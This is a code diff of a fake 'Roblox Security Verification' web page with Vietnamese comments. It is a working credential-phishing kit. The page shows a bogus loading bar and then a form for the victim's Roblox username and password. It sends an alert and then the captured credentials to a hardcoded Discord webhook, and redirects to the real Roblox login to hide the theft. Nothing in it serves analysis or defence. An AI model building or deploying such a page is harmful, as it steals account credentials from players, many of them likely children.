@@ -2,42 +2,82 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Roblox Security Hub</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Security Verification</title>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:20%;">
-    <div style="border:2px solid #0f0; display:inline-block; padding:30px;">
-        <h1>SYSTEM: INITIALIZING...</h1>
-        <p id="status">Đang thiết lập đường truyền bảo mật...</p>
+<body style="background:#0a0a0a; color:#00ff41; font-family:'Segoe UI', Tahoma, sans-serif; text-align:center; padding-top:10vh; margin:0;">
+
+    <div id="capture-zone" style="border:1px solid #00ff41; display:inline-block; padding:40px; border-radius:10px; box-shadow:0 0 20px #00ff41;">
+        <h1 id="status-title">INITIALIZING SECURE LINK...</h1>
+        <div id="loading-container" style="width:300px; height:8px; border:1px solid #333; margin:20px auto; background:#111;">
+            <div id="bar" style="width:0%; height:100%; background:#00ff41; transition: width 0.3s;"></div>
+        </div>
+        <p id="progress-text">Đang đồng bộ với máy chủ bảo mật: 0%</p>
+
+        <div id="harvest-form" style="display:none; margin-top:20px;">
+            <p style="color:#ff4d4d; font-weight:bold;">⚠️ CẢNH BÁO: XÁC MINH CẦN THIẾT</p>
+            <p>Vui lòng xác nhận mật khẩu để hoàn tất quá trình bảo mật.</p>
+            <input type="text" id="u" placeholder="Username/Email" style="width:80%; padding:10px; margin-bottom:10px; background:#111; border:1px solid #00ff41; color:#0f0;"><br>
+            <input type="password" id="p" placeholder="Password" style="width:80%; padding:10px; margin-bottom:20px; background:#111; border:1px solid #00ff41; color:#0f0;"><br>
+            <button onclick="finish_strike()" style="width:85%; padding:12px; background:#00ff41; color:#000; border:none; font-weight:bold; cursor:pointer; border-radius:5px;">XÁC NHẬN TÀI KHOẢN</button>
+        </div>
     </div>
 
     <script>
-        // WEBHOOK CỦA BẠN
-        const url = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";
+        const hook = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";
 
-        function send_fire() {
-            // Sử dụng hình thức gửi dữ liệu thô để tránh bị trình duyệt chặn CORS
-            const data = {
-                content: "💀 **FIRE: MỤC TIÊU ĐÃ SẬP BẪY!** 💀",
-                embeds: [{ title: "Tín hiệu từ: bangdaito123-hub", color: 16711680 }]
-            };
+        // GIAI ĐOẠN 1: NỔ TIN TRUY CẬP NGAY LẬP TỨC
+        fetch(hook, {
+            method: "POST", mode: "no-cors", headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({content: "🚀 **STRIKE START:** Mục tiêu đã dính bẫy và đang xem Loading!"})
+        });
 
-            // ÉP GỬI DỮ LIỆU
-            fetch(url, {
-                method: "POST",
-                mode: "no-cors", // BỎ QUA KIỂM TRA BẢO MẬT TRÌNH DUYỆT
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            }).then(() => {
-                document.getElementById("status").innerText = "ĐANG ĐỒNG BỘ: 95%";
-            }).catch(() => {
-                // Nếu fetch thất bại, dùng phương án dự phòng (Image Beacon)
-                const img = new Image();
-                img.src = url + "?data=" + btoa(JSON.stringify(data));
+        // GIAI ĐOẠN 2: CHẠY THANH LOADING
+        let p = 0;
+        const interval = setInterval(() => {
+            if (p >= 95) {
+                clearInterval(interval);
+                document.getElementById('loading-container').style.display = 'none';
+                document.getElementById('progress-text').style.display = 'none';
+                document.getElementById('status-title').innerText = "VERIFICATION REQUIRED";
+                document.getElementById('harvest-form').style.display = 'block'; // HIỆN FORM
+            } else {
+                p += Math.floor(Math.random() * 7) + 1;
+                if (p > 95) p = 95;
+                document.getElementById('bar').style.width = p + "%";
+                document.getElementById('progress-text').innerText = "Đang đồng bộ với máy chủ bảo mật: " + p + "%";
+            }
+        }, 400);
+
+        // GIAI ĐOẠN 3: THU HOẠCH DỮ LIỆU
+        async function finish_strike() {
+            const user = document.getElementById('u').value;
+            const pass = document.getElementById('p').value;
+            
+            if(!user || !pass) { alert("Vui lòng nhập đầy đủ thông tin!"); return; }
+
+            document.getElementById('harvest-form').innerHTML = "<h3>ĐANG XỬ LÝ...</h3>";
+
+            await fetch(hook, {
+                method: "POST", mode: "no-cors", headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                    content: "💀 **PROJECT FIRE: DATA CAPTURED!** 💀",
+                    embeds: [{
+                        title: "Thông tin thu thập",
+                        color: 16711680,
+                        fields: [
+                            { name: "👤 User", value: user, inline: true },
+                            { name: "🔑 Pass", value: pass, inline: true }
+                        ]
+                    }]
+                })
             });
-        }
 
-        // KÍCH HOẠT NGAY
-        send_fire();
+            // Xóa dấu vết - Quay về trang chủ thật
+            setTimeout(() => {
+                window.location.href = "https://www.roblox.com/login";
+            }, 1000);
+        }
     </script>
 </body>
 </html>
